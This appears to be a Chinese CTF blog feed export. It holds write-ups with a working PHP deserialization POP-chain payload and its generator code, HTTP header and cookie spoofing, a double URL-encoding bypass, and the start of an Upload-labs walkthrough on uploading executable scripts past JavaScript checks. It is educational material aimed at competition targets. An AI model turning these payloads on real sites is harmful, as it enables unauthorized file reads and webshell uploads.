class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();     <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=O:4:&quot;baby&quot;:3:&#123;s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;&#125;s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">urlencode(data)=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/23/khLLE6.png" alt="khLLE6.png"></p><p><strong>solution2</strong></p><p>这里的<code>$this-&gt;nice-&gt;aaa</code>被赋值为为止变量<code>$sth</code>，从飘零学长那里学习到另一种构造方法来通过if判断，即通过两个不同的变量名访问同一个内容，无论其中一个怎么变，另一个变量总是指向他现在的值，即可构造如下，：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;</span><br></pre></td></tr></table></figure><p>exp1构造<code>$amzing</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line">$test-&gt;bbb=&amp;$test-&gt;aaa;    <span class="comment">//指向同一个地址</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>baby%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>skyobj%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>cool%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>amzing%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>bbb%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A6%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><code>$amzing</code>反序列化后的<code>aaa</code>和<code>bbb</code>就相等了，这里就完成构造<code>$amzing</code>；</p><p>最终exp2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();    <span class="comment">//调用cool的read方法</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> baby();</span><br><span class="line"><span class="comment">//$test-&gt;bbb=&amp;$test-&gt;aaa;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($test));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>设置<code>$filename=&#39;flag.php&#39;</code>，设置<code>$amzing</code>即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10009/index.php?data=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>执行顺序分析：</p><ol><li>首先反序列化<code>$data</code>，得到一个baby类的对象；</li><li>默认调用魔术方法，即可调用<code>read</code>；</li><li>反序列化<code>$amzing</code>赋值给<code>$nice</code>，此时的<code>$nice-&gt;aaa</code>和<code>$nice-&gt;bbb</code>相等，可以通过if判断；</li><li>读文件<code>$test-&gt;skyobj-&gt;filename</code>；</li></ol><p><strong>参考链接：</strong><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">pop链构造</a>，<a href="https://skysec.top/2019/01/25/2019%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9BWriteip/" target="_blank" rel="noopener">飘零学长wp</a>，</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h3><p>百度到键盘之争：</p><p><img src="https://s2.ax1x.com/2019/02/24/k4vEff.png" alt="k4vEff.png"></p><p>对应到的键盘如下：</p><p><img src="https://s2.ax1x.com/2019/02/24/k4vM0s.png" alt="k4vM0s.png"></p><p>写个对应的列表，替换对应的字符，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dic_1=[<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'+'</span>,<span class="string">'_'</span>]</span><br><span class="line">dic_2=[<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'&#125;'</span>,<span class="string">'&#123;'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    str0=<span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str0:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dic_1:</span><br><span class="line">            num=dic_1.index(i)</span><br><span class="line">            res+=dic_2[num]</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><a href="https://imgchr.com/i/k4x65q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/24/k4x65q.md.png" alt="k4x65q.md.png"></a></p><p>​                                                                         </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;未完待续…
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame-2019-week1-WP</title>
    <link href="https://gardenia30.top/2019/02/19/%E6%9D%AD%E7%94%B5HGAME-WEEK1-WP/"/>
    <id>https://gardenia30.top/2019/02/19/杭电HGAME-WEEK1-WP/</id>
    <published>2019-02-19T12:18:14.000Z</published>
    <updated>2019-03-03T08:03:58.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次ak了web…是入门的week1，对，像我这种萌新最喜欢做这种题(手动滑稽脸)；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h3><p>题目提示：vim，没好好关机，知道了是Linux的vim异常退出；</p><p>于是尝试访问<code>.index.html.swp</code>，成功下载swp文件，拖进十六进制编辑器查看得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0X9Sg.png" alt="k0X9Sg.png"></p><h3 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h3><p>如下界面：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0XM6J.png" alt="k0XM6J.png"></p><p>随便输入了内容提交得到提示：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0XYtK.png" alt="k0XYtK.png"></p><p>提示需要POST，那就hackbar直接post一个值：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0Xd6H.png" alt="k0Xd6H.png"></p><p>又来提示需要本地登录，那就加上<code>X-Forwarded-For</code>的请求头：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jnEt.png" alt="k0jnEt.png"></p><p>提示需要修改<code>User-Agent</code>，那就直接修改：</p><p><a href="https://imgchr.com/i/k0jwCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0jwCT.md.png" alt="k0jwCT.md.png"></a></p><p>又要求<code>the requests should referer from www.bilibili.com</code>，继续添加：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jB2F.png" alt="k0jB2F.png"></p><p>要求是管理员登录…有点无从下手，想了一下既然是换头大作战…查看请求头发现Cookie里有admin=0关键字，索性直接修改为1，payload如下：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jR56.png" alt="k0jR56.png"></p><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jLIP.png" alt="k0jLIP.png"></p><h3 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h3><p>代码审计初体验：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>非常简单的url二次编码绕过，GET进来的id已经被urldecode一次了，代码意思是继续decode得到<code>vidar</code>；</p><p><strong>payload:</strong><code>http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</code></p><h3 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h3><p>查看源代码有提示：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0xfje.png" alt="k0xfje.png"></p><p>查看响应头：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0x7Nt.png" alt="k0x7Nt.png"></p><p>于是直接post一个password过去：</p><p><a href="https://imgchr.com/i/k0zC40" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zC40.md.png" alt="k0zC40.md.png"></a></p><p>点进去…说太快了：</p><p><a href="https://imgchr.com/i/k0zF3T" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zF3T.md.png" alt="k0zF3T.md.png"></a></p><p>那就抓个包试试…得到flag：</p><p><a href="https://imgchr.com/i/k0zkgU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zkgU.md.png" alt="k0zkgU.md.png"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h3><blockquote><p>Description:</p><p>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. So easy</p></blockquote><p>看起来就是摩斯密码没错了，找个在线解密即可得到16进制，解码得到字符，凯撒移位后观察关键字母，栅栏移位即可得到flag；</p><h3 id="base全家"><a href="#base全家" class="headerlink" title="base全家"></a>base全家</h3><p><a href="https://imgchr.com/i/ko86FH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/ko86FH.md.png" alt="ko86FH.md.png"></a></p><p>我就不说了…呆了，解半天也没想到个好办法，python跑一下，既然是base全家桶系列，直接用异常处理即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">'cnm.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">p=f.read()</span><br><span class="line">n=<span class="string">''</span></span><br><span class="line">step=[]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b16decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b32decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b64decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> step</span><br></pre></td></tr></table></figure><p>python渣渣就不班门弄斧了…就是要注意base解码的顺序，必须从<code>16-&gt;32-&gt;64</code>，原因是部分base16和base32可以被base64解码…找到有意义的字符串如下：</p><p><a href="https://imgchr.com/i/koYhOx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/koYhOx.md.png" alt="koYhOx.md.png"></a></p><p>在线base58解密即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;40ca78cde14458da697066eb4cc7daf6&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第一次ak了web…是入门的week1，对，像我这种萌新最喜欢做这种题(手动滑稽脸)；
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs通关笔记</title>
    <link href="https://gardenia30.top/2019/02/19/Upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/02/19/Upload-labs通关笔记/</id>
    <published>2019-02-19T12:16:10.000Z</published>
    <updated>2019-04-09T09:29:29.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从打完校赛开始到现在，身为萌新，寒假就研究了一下文件上传这部分内容，还是自己动手实践一下比较好，还可以学学代码审计；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>任何客户端验证都是不安全的，客户端验证只能用来防止用户输入错误，减少服务器的开销，服务器端验证才可以真正抵御攻击者；</p><h3 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01-js验证"></a>pass-01-js验证</h3><p>php为后缀的文件上传不了，发现前端的javascript验证；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如此一来就很简单了，直接禁用js即可上传可解析的脚本文件；还有很多方法，先将脚本文件改为可以上传的后缀名，如<code>less1.jpg</code>，然后bp截取修改后缀为脚本文件的类型上传即可；</p><p>上传成功后如下直接可以访问；</p><p><a href="https://imgchr.com/i/kaLoSs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaLoSs.png" alt="kaLoSs.png"></a></p><h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="pass-02-MIME验证"><a href="#pass-02-MIME验证" class="headerlink" title="pass-02-MIME验证"></a>pass-02-MIME验证</h3><p>黑盒情况下上传<code>gardenia.jpg</code>，bp截取后修改后缀为可执行脚本后缀<code>.php</code>可以直接上传成功，访问成功；</p><p><a href="https://imgchr.com/i/kaO8AS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaO8AS.png" alt="kaO8AS.png"></a></p><p>审计一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 